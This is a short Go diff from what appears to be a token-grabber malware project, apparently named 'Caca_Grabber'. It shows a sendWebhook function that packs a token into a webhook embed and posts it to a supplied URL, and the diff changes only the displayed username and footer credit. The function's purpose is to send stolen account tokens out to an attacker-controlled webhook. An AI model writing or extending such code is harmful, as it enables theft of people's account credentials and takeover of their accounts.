@@ -14,7 +14,7 @@ import (
 
 func sendWebhook(url, token string) {
 	data := map[string]interface{}{
-		"username":   "Dev Build",
+		"username":   "Caca_Grabber",
 		"avatar_url": "https://images.rtl.fr/~c/1540v1026/rtl/www/1319636-poopemojihp-1.jpg",
 		"embeds": []map[string]interface{}{
 			{
@@ -22,7 +22,7 @@ func sendWebhook(url, token string) {
 				"description": fmt.Sprintf("`%s`", token),
 				"color":       0xFF0000,
 				"footer": map[string]string{
-					"text": "Made By Caca1",
+					"text": "Made By Caca",
 				},
 				"thumbnail": map[string]string{
 					"url": "https://images.rtl.fr/~c/1540v1026/rtl/www/1319636-poopemojihp-1.jpg",
